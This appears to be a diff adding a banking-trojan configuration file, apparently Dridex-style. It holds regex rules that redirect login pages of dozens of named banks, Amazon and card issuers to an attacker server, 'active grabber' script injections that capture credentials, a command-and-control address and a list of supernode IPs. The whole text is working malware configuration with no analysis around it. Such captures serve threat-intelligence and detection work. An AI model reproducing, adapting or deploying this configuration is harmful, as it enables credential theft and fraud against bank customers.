+      <redirect name="bafoho_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/bafoho___FAKE_RND_NEW__/index.php" vnc="0">^https://web17\.secureinternetbank\.com/EBC_EBC1961/EBC1961\.ashx\?WCI=Process.*WCE=Request.*mfa=[0-9]</redirect>
+      <redirect name="bafoho_redirect_files" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/bafoho___FAKE_RND_NEW__/files/" vnc="0">^https://web17\.secureinternetbank\.com/EBC_EBC1961/files/</redirect>
+      <redirect name="bafoho_redirect_inj" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/bafoho___FAKE_RND_NEW__/default_redirect.js" vnc="0">^https://web17\.secureinternetbank\.com/EBC_EBC1961/default_redirect.js</redirect>
+      <redirect name="lakala_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/lakala_HPn7vWwV530MSsjr/" vnc="0">^https://www\.lakelandbank\.com/(login/){1,2}</redirect>
+      <redirect name="wabaca_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/wabaca_HPn7vWwV530MSsjr/" vnc="0">^https://cityntl\.webcashmgmt\.com/wcmfd/wcmpw/</redirect>
+      <redirect name="matawa_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/matawa_HPn7vWwV530MSsjr/" vnc="0">^https://webinfoplus\.mandtbank\.com/pub/html/</redirect>
+      <redirect name="ewaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/ewaba_HPn7vWwV530MSsjr/" vnc="0">^https://eastwest\.openbank\.com/s1gcb/logon/</redirect>
+      <redirect name="satara_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/satara_HPn7vWwV530MSsjr/" vnc="0">^https://wholesaleportal\.suntrust\.com/OCM/user/</redirect>
+      <redirect name="katata_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/katata_HPn7vWwV530MSsjr/" vnc="0">^https://ktt\.key\.com/ktt/cmd/</redirect>
+      <redirect name="agama_redirect_index" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/agama_HPn7vWwV530MSsjr/index.php" vnc="0">^https://securentrycorp\.amegybank\.com/Authentication/zbf(/k)?/([_0-9a-f]{2}[0-9a-f]{8}-[0-9a-f]{4}-.+|index\?)</redirect>
+      <redirect name="agama_redirect_files" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/agama_HPn7vWwV530MSsjr/files/" vnc="0">^https://securentrycorp\.amegybank\.com/Authentication/zbf(/k)?/files/</redirect>
+      <redirect name="agama_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/agama_HPn7vWwV530MSsjr/" vnc="0">^https://securentrycorp\.amegybank\.com/Authentication/zbf(/k)?/</redirect>
+      <redirect name="cabara_redirect_index" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/cabara_HPn7vWwV530MSsjr/index.php" vnc="0">^https://securentrycorp\.calbanktrust\.com/Authentication/zbf(/k)?/([_0-9a-f]{2}[0-9a-f]{8}-[0-9a-f]{4}-.+|index\?)</redirect>
+      <redirect name="cabara_redirect_files" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/cabara_HPn7vWwV530MSsjr/files/" vnc="0">^https://securentrycorp\.calbanktrust\.com/Authentication/zbf(/k)?/files/</redirect>
+      <redirect name="cabara_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/cabara_HPn7vWwV530MSsjr/" vnc="0">^https://securentrycorp\.calbanktrust\.com/Authentication/zbf(/k)?/</redirect>
+      <redirect name="nabaza_redirect_index" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/nabaza_HPn7vWwV530MSsjr/index.php" vnc="0">^https://securentrycorp\.nbarizona\.com/Authentication/zbf(/k)?/([_0-9a-f]{2}[0-9a-f]{8}-[0-9a-f]{4}-.+|index\?)</redirect>
+      <redirect name="nabaza_redirect_files" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/nabaza_HPn7vWwV530MSsjr/files/" vnc="0">^https://securentrycorp\.nbarizona\.com/Authentication/zbf(/k)?/files/</redirect>
+      <redirect name="nabaza_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/nabaza_HPn7vWwV530MSsjr/" vnc="0">^https://securentrycorp\.nbarizona\.com/Authentication/zbf(/k)?/</redirect>
+      <redirect name="vebaco_redirect_index" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/vebaco_HPn7vWwV530MSsjr/index.php" vnc="0">^https://securentrycorp\.vectrabank\.com/Authentication/zbf(/k)?/([_0-9a-f]{2}[0-9a-f]{8}-[0-9a-f]{4}-.+|index\?)</redirect>
+      <redirect name="vebaco_redirect_files" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/vebaco_HPn7vWwV530MSsjr/files/" vnc="0">^https://securentrycorp\.vectrabank\.com/Authentication/zbf(/k)?/files/</redirect>
+      <redirect name="vebaco_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/vebaco_HPn7vWwV530MSsjr/" vnc="0">^https://securentrycorp\.vectrabank\.com/Authentication/zbf(/k)?/</redirect>
+      <redirect name="zafaba_redirect_index" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/zafaba_HPn7vWwV530MSsjr/index.php" vnc="0">^https://securentrycorp\.zionsbank\.com/Authentication/zbf(/k)?/([_0-9a-f]{2}[0-9a-f]{8}-[0-9a-f]{4}-.+|index\?)</redirect>
+      <redirect name="zafaba_redirect_files" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/zafaba_HPn7vWwV530MSsjr/files/" vnc="0">^https://securentrycorp\.zionsbank\.com/Authentication/zbf(/k)?/files/</redirect>
+      <redirect name="zafaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/zafaba_HPn7vWwV530MSsjr/" vnc="0">^https://securentrycorp\.zionsbank\.com/Authentication/zbf(/k)?/</redirect>
+      <redirect name="hacaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/hacaba_HPn7vWwV530MSsjr/" vnc="0">^https://www\.hwtreasurysolution\.com/COLB/</redirect>
+      <redirect name="fumaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/fumaba_HPn7vWwV530MSsjr/" vnc="0">^https://fabtvla\.secure\.fundsxpress\.com/start/</redirect>
+      <redirect name="azama_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/azama_HPn7vWwV530MSsjr/index.php" vnc="0">^https://www\.amazon\.com/ap/signin</redirect>
+      <redirect name="azama_redirect_files" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/azama_HPn7vWwV530MSsjr/files/" vnc="0">^https://www\.amazon\.com/ap/files/</redirect>
+      <redirect name="azama_redirect_inj" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/azama_HPn7vWwV530MSsjr/default_redirect.js" vnc="0">^https://www\.amazon\.com/ap/default_redirect.js</redirect>
+      <redirect name="boa_redirect_inj" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/5/boa_HPn7vWwV530MSsjr/default_redirect.js" vnc="0">^https://secure\.bankofamerica\.com/login/sign-in/entry2/default_redirect\.js</redirect>
+      <redirect name="boa_redirect_files" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/5/boa_HPn7vWwV530MSsjr/files/" vnc="0">^https://secure\.bankofamerica\.com/login/sign-in/entry2/files/</redirect>
+      <redirect name="boa_redirect_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/5/boa_HPn7vWwV530MSsjr/" vnc="0">^https://secure\.bankofamerica\.com/login/sign-in/entry2/signOnV3\.go</redirect>
+      <redirect name="botoma_redirect_inj" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/botoma_HPn7vWwV530MSsjr/default_redirect.js" vnc="0">^https://secure\.bankofamerica\.com/login/sign-in/(entry/)?default_redirect\.js</redirect>
+      <redirect name="botoma_redirect_files" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/botoma_HPn7vWwV530MSsjr/files/" vnc="0">^https://secure\.bankofamerica\.com/login/sign-in/(entry/)?files/</redirect>
+      <redirect name="botoma_redirect_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/botoma_HPn7vWwV530MSsjr/index.php" vnc="0">^https://secure\.bankofamerica\.com/login/sign-in/(entry/)?signOnV2(Screen)?\.go</redirect>
+      <redirect name="chase_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/5/chasettk_HPn7vWwV530MSsjr/" vnc="0">^https://chaseonline\.chase\.com/</redirect>
+      <redirect name="usaa_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/5/usaa_ttk_HPn7vWwV530MSsjr/" vnc="0">^https://www\.usaa\.com/inet/ent_logon/j_security_check</redirect>
+      <redirect name="usaa_redirect_files" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/5/usaa_ttk_HPn7vWwV530MSsjr/files/" vnc="0">^https://www\.usaa\.com/inet/ent_logon/files/</redirect>
+      <redirect name="usaa_redirect_inj" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/5/usaa_ttk_HPn7vWwV530MSsjr/default_redirect.js" vnc="0">^https://www\.usaa\.com/inet/ent_logon/default_redirect.js</redirect>
+      <redirect name="schwab_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/5/schwab_ttk_HPn7vWwV530MSsjr/" vnc="0">^https://client.schwab.com/Login/SignOn/CustomerCenterLogin.aspx</redirect>
+      <redirect name="schwab_redirect_files" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/5/schwab_ttk_HPn7vWwV530MSsjr/files/" vnc="0">^https://client.schwab.com/Login/SignOn/files/</redirect>
+      <redirect name="schwab_redirect_inj" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/5/schwab_ttk_HPn7vWwV530MSsjr/default_redirect.js" vnc="0">^https://client.schwab.com/Login/SignOn/default_redirect.js</redirect>
+      <redirect name="amex_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/amex_HPn7vWwV530MSsjr/\1" vnc="0">^https://online.americanexpress.com/myca/logon/us/action/(.*LogonHandler.*)</redirect>
+      <redirect name="amex_redirect_files" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/amex_HPn7vWwV530MSsjr/files/" vnc="0">^https://online.americanexpress.com/myca/logon/us/action/files/</redirect>
+      <redirect name="amex_redirect_inj" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/amex_HPn7vWwV530MSsjr/default_redirect.js" vnc="0">^https://online.americanexpress.com/myca/logon/us/action/default_redirect.js</redirect>
+      <redirect name="bomobo_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/bomobo_HPn7vWwV530MSsjr/" vnc="0">^https://www[0-9]{1,3}\.bmo\.com/uiauth/AuthWeb/</redirect>
+      <redirect name="cibaca_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/cibaca_HPn7vWwV530MSsjr/" vnc="0">^https://www\.cibconline\.cibc\.com/ebm-resources/public/banking/cibc/client/web/</redirect>
+      <redirect name="camaci_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/camaci_HPn7vWwV530MSsjr/" vnc="0">^https://cmo\.cibc\.com/wps/portal/BBD/bbdsignon/.*\!ut/p/.+/d.+/d[0-9]{1,2}/[a-z0-9]+/</redirect>
+      <redirect name="rabaca_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/rabaca_HPn7vWwV530MSsjr/" vnc="0">^https://www[0-9]{1,2}\.royalbank\.com/cgi-bin/rbaccess/</redirect>
+      <redirect name="socoba_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/socoba_HPn7vWwV530MSsjr/" vnc="0">^https://uas1\.cams\.scotiabank\.com/aos/</redirect>
+      <redirect name="tadaba_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/tadaba_HPn7vWwV530MSsjr/" vnc="0">^https://businessbanking\.tdcommercialbanking\.com/WBB/</redirect>
+      <redirect name="citi_pers_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/citi_pers_HPn7vWwV530MSsjr/" vnc="0">^https://online.citi.com/US/JSO/signon/ProcessUsernameSignon.do</redirect>
+      <redirect name="citi_pers_redirect_files" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/citi_pers_HPn7vWwV530MSsjr/files/" vnc="0">^https://online.citi.com/US/JSO/signon/files/</redirect>
+      <redirect name="citi_pers_redirect_inj" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/citi_pers_HPn7vWwV530MSsjr/default_redirect.js" vnc="0">^https://online.citi.com/US/JSO/signon/default_redirect.js</redirect>
+      <redirect name="huntington" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/huntington_HPn7vWwV530MSsjr/" vnc="0">^https://businessonline\.huntington\.com/bolhome/</redirect>
+      <redirect name="camana_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/camana_HPn7vWwV530MSsjr/" vnc="0">^https://secure[0-9]{1,3}\.onlineaccess1\.com/camdennationalbankonline/</redirect>
+      <redirect name="facosa_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/facosa_HPn7vWwV530MSsjr/" vnc="0">^https://www\.fcsolb\.com/cb/pages/jsp-ns/</redirect>
+      <redirect name="usaa_active_grabber" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/usaba_HPn7vWwV530MSsjr/eventExtend.php" vnc="0">^https://www\.usaa\.com/inet/ent_logon/default_redirect.js</redirect>
+      <redirect name="amazon_sellerscentral_active_grabber" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/dg_secema_HPn7vWwV530MSsjr/eventExtend.php" vnc="0">^https://sellercentral\.amazon\.com/ap/asdnaisufniasufniausnfasfn.js</redirect>
+      <redirect name="chase_active_grabber" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/dg_cheseba_HPn7vWwV530MSsjr/eventExtend.php" vnc="0">^https://(.+\.)?chase\.com/iseufseiufnesifn.js</redirect>
+      <redirect name="citi_active_grabber" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/dg_citiba_HPn7vWwV530MSsjr/eventExtend.php" vnc="0">^https://(.+\.)?citi\.com/niuvsnegiushgisudngkjsdbg.js</redirect>
+      <redirect name="irisoba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/irisoba_HPn7vWwV530MSsjr/" vnc="0">^https://iris\.sovereignbank\.com/wcmfd/wcmpw/</redirect>
+    </redirects2>
+    <redirects>
+      <redirects onget="1" onpost="1" timeout="300" type="allow">^https://secure\.bankofamerica\.com/myaccounts/signin/signIn\.go</redirects>
+      <redirects onget="1" onpost="1" timeout="300" type="allow">^https://online\.wellsfargo\.com/das/cgi\-bin/session\.cgi\?screenid\=SIGNON_PORTAL_PAUSE</redirects>
+      <redirects onget="1" onpost="1" timeout="2000" type="allow">^https://connect\.secure\.wellsfargo\.com/auth/login/do</redirects>
+      <redirects onget="1" onpost="1" timeout="300" type="allow">^https://connect\.secure\.wellsfargo\.com/accounts/start</redirects>
+      <redirects onget="1" onpost="1" timeout="300" type="allow">^https://connect\.secure\.wellsfargo\.com/accounts/inquiry/summary/default</redirects>
+      <redirects onget="1" onpost="0" timeout="100" type="allow">cr;ff:^https://secure.+\.chase\.com/.+/accounts/secure/v2/account/detail/dda/list;ie:^https://secure.*\.chase\.com/web/accounts/dashboard/index</redirects>
+      <redirects onget="1" onpost="0" timeout="2000" type="allow">https://secure.*.chase.com/web/auth/router\?lob=COLLogon</redirects>
+      <redirects onget="1" onpost="1" timeout="300" type="allow">^https://online\.citi\.com/US/REST/accountsPanel/getCustomerAccounts\.jws</redirects>
+      <redirects onget="1" onpost="1" timeout="300" type="allow">^https://secure\.capitalone360\.com/myaccount/banking/account_summary\.vm</redirects>
+      <redirects onget="1" onpost="1" timeout="300" type="allow">^https://chaseonline\.chase\.com/MyAccounts\.aspx</redirects>
+      <redirects onget="1" onpost="1" timeout="300" type="allow">^https://oltx\.fidelity\.com/ftgw/fbc/oftop/portfolio</redirects>
+      <redirects onget="1" onpost="1" timeout="1000" type="deny">\.(gif|png|bmp|jpg|css|swf|ico|js|pdf|doc|docx|txt)($|\?)</redirects>
+      <redirects onget="1" onpost="1" timeout="1000" type="deny">(resource\.axd|yimg\.com)</redirects>
+    </redirects>
+    <handlers>
+      <handler handler="timeout" name="name" script="switchoff.js">https://45.55.25.107:3889/B88U86giIPyD55RK/</handler>
+    </handlers>
+    <httpblocks>
+      <httpblock a="0" b="0" type="allow">sofa\.bankofamerica\.com/eluminate\?.+hr=https.*secure\.bankofamerica\.com/.+signOnV2(Screen)?.go</httpblock>
+    </httpblocks>
+    <clickshots>
+      <clickshot clicks="30" onget="1" onpost="1" type="allow" xrange="3000" yrange="2000">^https://(login|www)\.tranzact\.org/</clickshot>
+    </clickshots>
+    <timestamp>2018-05-07T10:30:06+00:00</timestamp>
+  </config>
+  <c2>
+    <host>
+      <port>3889</port>
+      <ip>45.55.25.107</ip>
+    </host>
+  </c2>
+  <supernodes>
+    <node>
+      <ip>37.153.92.6</ip>
+      <port>444</port>
+    </node>
+    <node>
+      <ip>37.153.92.6</ip>
+      <port>1443</port>
+    </node>
+    <node>
+      <ip>195.123.214.147</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>185.236.77.228</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>137.99.122.155</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>50.206.15.189</ip>
+      <port>8443</port>
+    </node>
+    <node>
+      <ip>24.192.173.97</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>76.112.27.179</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>120.150.176.33</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>212.32.242.204</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>116.73.18.59</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>99.229.216.212</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>24.228.72.116</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>172.249.88.69</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>193.251.189.134</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>37.153.92.6</ip>
+      <port>8443</port>
+    </node>
+    <node>
+      <ip>81.254.168.177</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>212.237.42.204</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>109.21.222.28</ip>
+      <port>443</port>
+    </node>
+  </supernodes>
+</settings>
